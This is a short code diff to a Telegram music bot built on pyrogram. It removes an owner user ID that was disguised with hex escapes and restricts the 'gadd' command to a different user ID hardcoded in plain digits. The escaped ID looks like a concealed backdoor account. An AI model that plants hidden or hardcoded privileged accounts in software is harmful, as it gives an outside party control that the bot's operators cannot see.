@@ -2,7 +2,6 @@ import asyncio
 
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
-OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
 from VIPMUSIC import app
 from VIPMUSIC.utils.database import add_served_chat, get_assistant
 
@@ -48,7 +47,7 @@ async def clones(client: Client, message: Message):
 import asyncio
 
 
-@app.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
+@app.on_message(filters.command("gadd") & filters.user(int(6391774843)))
 async def add_allbot(client, message):
     command_parts = message.text.split(" ")
     if len(command_parts) != 2:
